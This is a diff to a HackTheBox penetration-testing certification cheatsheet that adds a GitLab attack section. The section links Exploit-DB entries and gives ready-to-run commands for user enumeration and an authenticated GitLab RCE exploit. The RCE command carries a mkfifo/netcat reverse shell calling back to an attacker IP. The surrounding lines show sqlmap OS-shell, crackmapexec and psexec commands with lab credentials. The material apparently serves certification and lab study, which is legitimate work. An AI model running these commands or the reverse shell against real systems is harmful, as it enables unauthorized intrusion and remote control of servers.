@@ -77,6 +77,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [Attacking Common Applications](#attacking-common-applications)
   	- [Splunk](#splunk)
   	- [PRTG](#prtg)
+  	- [GITLAB](#gitlab)
 - [Useful Resources](#useful-resources)
 
 
@@ -1949,6 +1950,13 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 	--> sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
 	--> impacket-psexec APP03/prtgadm1:'Pwn3d_by_PRTG!'@10.129.201.50
 	
+```
+### GITLAB
+```
+--> https://www.exploit-db.com/exploits/49821
+	--> ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt	
+--> https://www.exploit-db.com/exploits/49951
+	--> python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
 ```
 ## Useful Resources
 
